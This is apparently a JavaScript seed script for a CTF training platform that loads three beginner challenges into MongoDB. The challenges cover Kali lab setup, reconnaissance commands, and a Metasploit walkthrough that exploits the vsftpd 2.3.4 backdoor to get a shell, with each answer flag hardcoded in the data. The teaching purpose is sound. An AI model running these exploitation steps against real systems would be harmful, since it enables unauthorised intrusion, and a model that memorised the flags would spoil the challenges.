// Convert ES module imports to CommonJS
const mongoose = require('mongoose');
const dotenv = require('dotenv');
const { Challenge } = require('../src/lib/models/Challenge.ts');

// Ensure environment variables are loaded
dotenv.config();

// Remove TypeScript interface and type assertions
// const MONGODB_URI = process.env.MONGODB_URI as string;
const MONGODB_URI = process.env.MONGODB_URI;

if (!MONGODB_URI) {
  throw new Error('MONGODB_URI environment variable is not defined');
}

// Remove TypeScript type annotation
const challenges = [
  {
    title: "Setting Up Your Pentesting Environment",
    description: "Learn how to set up a proper ethical hacking environment with Kali Linux and essential tools.",
    content: `# Setting Up Your Pentesting Environment

## Objective
Set up a secure and isolated ethical hacking lab using Kali Linux.

## Requirements
- VirtualBox or VMware
- Kali Linux ISO
- At least 4GB RAM and 20GB free disk space

## Instructions

### Step 1: Download Kali Linux
- Visit https://www.kali.org/get-kali/ and download the installer ISO
- Use the 64-bit installer for better compatibility

### Step 2: Create a Virtual Machine
- Use VirtualBox or VMware to create a VM with the following settings:
  - 2 CPUs, 4GB RAM, 20GB storage
  - Bridged or NAT networking mode

### Step 3: Install Kali Linux
- Boot the VM with the Kali ISO
- Go through the graphical installation
- Set up a strong root password

### Step 4: Post-Installation
- Run \`apt update && apt upgrade\`
- Install tools: \`sudo apt install nmap net-tools gobuster\`

### Step 5: Test Lab
- Set up a second vulnerable VM (e.g., Metasploitable2)
- Configure them on the same network to simulate attacks

## Flag
Once your setup is complete, locate the hidden file in /root:
\`cat /root/flag.txt\`

Enter the flag you find above to complete this challenge.`,
    category: "getting-started",
    difficulty: "easy",
    points: 50,
    flag: "FLAG{environment_setup_complete}",
    server_credentials: null
  },
  {
    title: "Basic Reconnaissance Techniques",
    description: "Master the fundamentals of information gathering and reconnaissance in ethical hacking.",
    content: `# Basic Reconnaissance Techniques

## Objective
Gather intelligence on a target system using passive and active techniques.

## Tools
- Nmap
- Whois
- dig
- theHarvester

## Instructions

### Step 1: Domain Intelligence
- Run \`whois target.com\`
- Use \`dig target.com any\` to get DNS info
- Optional: Use \`theHarvester -d target.com -b all\`

### Step 2: Network Scanning
- Run \`nmap -sV target.com\`
- Identify open ports and services

### Step 3: Document Your Findings
- Note services, versions, and potentially vulnerable ports

## Flag
Inspect port 31337 using Nmap service detection:
\`nmap -sV -p 31337 target.com\`

Read the banner to extract the flag.

Enter the flag you find above to complete this challenge.`,
    category: "getting-started",
    difficulty: "easy",
    points: 50,
    flag: "FLAG{recon_master}",
    server_credentials: null
  },
  {
    title: "Introduction to Exploitation",
    description: "Learn the basics of vulnerability assessment and exploitation in a controlled environment.",
    content: `# Introduction to Exploitation

## Objective
Exploit a known vulnerability on a target system.

## Lab Setup
- Use Metasploitable2 or DVWA as your target
- Kali Linux as attacker VM

## Instructions

### Step 1: Discover Services
Run Nmap:
\`nmap -sV <target-ip>\`

### Step 2: Identify Vulnerable Service
Find an outdated vsftpd version:
\`21/tcp open ftp vsftpd 2.3.4\`

### Step 3: Exploit the Service
In Metasploit:
\`msfconsole\`
\`use exploit/unix/ftp/vsftpd_234_backdoor\`
\`set RHOST <target-ip>\`
\`run\`

### Step 4: Get a Shell and Find the Flag
Once inside:
\`cat /root/flag.txt\`

Enter the flag you find above to complete this challenge.`,
    category: "getting-started",
    difficulty: "easy",
    points: 50,
    flag: "FLAG{exploit_basics}",
    server_credentials: null
  }
];

async function createChallenges() {
  try {
    await mongoose.connect(MONGODB_URI, {
      maxPoolSize: 10,
      minPoolSize: 5,
      connectTimeoutMS: 10000,
      socketTimeoutMS: 45000
    });

    await Challenge.deleteMany({});
    console.log("Deleted existing challenges");

    const createdChallenges = await Challenge.insertMany(challenges);
    console.log(`Created ${createdChallenges.length} challenges`);

    await mongoose.disconnect();
    process.exit(0);
  } catch (error) {
    console.error("Error creating challenges:", error instanceof Error ? error.message : error);
    await mongoose.disconnect();
    process.exit(1);
  }
}

createChallenges();
